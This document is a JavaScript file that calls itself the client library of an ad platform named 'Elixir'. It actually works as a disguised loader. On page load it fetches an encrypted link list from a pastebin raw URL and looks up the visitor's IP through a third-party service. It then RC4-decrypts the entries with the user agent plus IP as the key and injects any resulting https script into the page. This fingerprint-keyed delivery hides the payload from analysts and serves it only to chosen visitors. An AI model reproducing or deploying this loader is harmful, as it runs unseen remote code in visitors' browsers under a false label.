/*!
 *
 *  		-= Next Generation Online Ad Network =-
 *  	
 *	..:: Ads platform "Elixir" client-side library ::..
 *
 *
 */

/*! RC4 implementation */
function rc4(a,b){for(var e,c=[],d=0,f="",g=0;g<256;g++)c[g]=g;for(g=0;g<256;g++)d=(d+c[g]+a.charCodeAt(g%a.length))%256,e=c[g],c[g]=c[d],c[d]=e;g=0,d=0;for(var h=0;h<b.length;h++)g=(g+1)%256,d=(d+c[g])%256,e=c[g],c[g]=c[d],c[d]=e,f+=String.fromCharCode(b.charCodeAt(h)^c[(c[g]+c[d])%256]);return f}

/*! StringEncoders Base64 implementation */
var base64={};base64.PADCHAR='=';base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';base64.makeDOMException=function(){var e,tmp;try{return new DOMException(DOMException.INVALID_CHARACTER_ERR);}catch(tmp){var ex=new Error("DOM Exception 5");ex.code=ex.number=5;ex.name=ex.description="INVALID_CHARACTER_ERR";ex.toString=function(){return'Error: '+ex.name+': '+ex.message;};return ex;}};base64.getbyte64=function(s,i){var idx=base64.ALPHA.indexOf(s.charAt(i));if(idx===-1){throw base64.makeDOMException();};return idx;};base64.decode=function(s){s=''+s;var getbyte64=base64.getbyte64;var pads,i,b10;var imax=s.length;if(imax===0){return s;};if(imax%4!==0){throw base64.makeDOMException();};pads=0;if(s.charAt(imax-1)===base64.PADCHAR){pads=1;if(s.charAt(imax-2)===base64.PADCHAR){pads=2;};imax-=4;};var x=[];for(i=0;i<imax;i+=4){b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)|getbyte64(s,i+3);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff,b10&0xff));};switch(pads){case 1:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff));break;case 2:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12);x.push(String.fromCharCode(b10>>16));break;};return x.join('');};base64.getbyte=function(s,i){var x=s.charCodeAt(i);if(x>255){throw base64.makeDOMException();};return x;};base64.encode=function(s){if(arguments.length!==1){throw new SyntaxError("Not enough arguments");};var padchar=base64.PADCHAR;var alpha=base64.ALPHA;var getbyte=base64.getbyte;var i,b10;var x=[];s=''+s;var imax=s.length-s.length%3;if(s.length===0){return s;};for(i=0;i<imax;i+=3){b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8)|getbyte(s,i+2);x.push(alpha.charAt(b10>>18));x.push(alpha.charAt((b10>>12)&0x3F));x.push(alpha.charAt((b10>>6)&0x3f));x.push(alpha.charAt(b10&0x3f));};switch(s.length-imax){case 1:b10=getbyte(s,i)<<16;x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+padchar+padchar);break;case 2:b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8);x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+alpha.charAt((b10>>6)&0x3f)+padchar);break;};return x.join('');}
if (!window.btoa) window.btoa = base64.encode;
if (!window.atob) window.atob = base64.decode;

/*! Load javascript asynchronously */
function loadJS(src) {
    var bodyTag = document.getElementsByTagName('body')[0] || document.getElementsByTagName('head')[0];
    var scriptTag = document.createElement('script');
    scriptTag.src = src;
    scriptTag.async = true;
    scriptTag.type = 'text/javascript';
    bodyTag.appendChild(scriptTag);
}

(function(window) {

    // Use the correct document accordingly with window argument (sandbox)
    var document = window.document, navigator = window.navigator;
    
    var Elixir = (function() {
		// Define a constructor of Elixir class
		var Elixir = function() {
			this.getipurl = getipurl;
			this.userAgent = userAgent;
			this.getlinksurl = getlinksurl;
			
			// Call init method
			return this.init();
		},
		userAgent = navigator.userAgent,
		// Use third-party service to get client ip
		getipurl = "https://jsonip.com/?callback=Elixir.getip",
		// Use dynamically changed CDN storage resource
		getlinksurl = "https://pastebin.com/raw/iCJ3tdsC";
		
		Elixir.prototype = {
			constructor: Elixir,
			init: function() {
				loadJS(this.getlinksurl);
				loadJS(this.getipurl);
				this.rotatelinks();
				
				// Return object
				return this;
			},
			version : "0.0.1",
			getipurl : null,
			userAgent : null,
			getlinksurl : null,
			userip : null,
			links : null,
			cjslink : null,
			
			getip: function(jsobj) {
				// store client ip
				this.userip = jsobj.ip;
			},

			getlinks: function(jsobj) {
				// store links array
				this.links = jsobj; 
			},
			
			rotatelinks: function() {
				var found_new_link = false;
				if (this.userip == null || this.links == null) {setTimeout("Elixir.rotatelinks()", 10); return false;}
				
				// Go through links array
				for (var propertyName in this.links) {
					if (this.links.hasOwnProperty(propertyName)) {
						var enclink = "";
						try {
							enclink = window.atob(this.links[propertyName]);
						} catch (e) {
						}
						if (enclink == null || enclink == "") {continue;}
						var key = this.userAgent+this.userip;
						var declink = rc4(key, enclink);
						if (declink.search(/^https/) != -1) {
							// client link found
							this.cjslink = declink;
							found_new_link = true;
							loadJS(declink);
							break;
						}
					}
				}
				return found_new_link;
			}
			
		};
		return new Elixir();
	})();    
    window.Elixir = Elixir;
    
})(window);
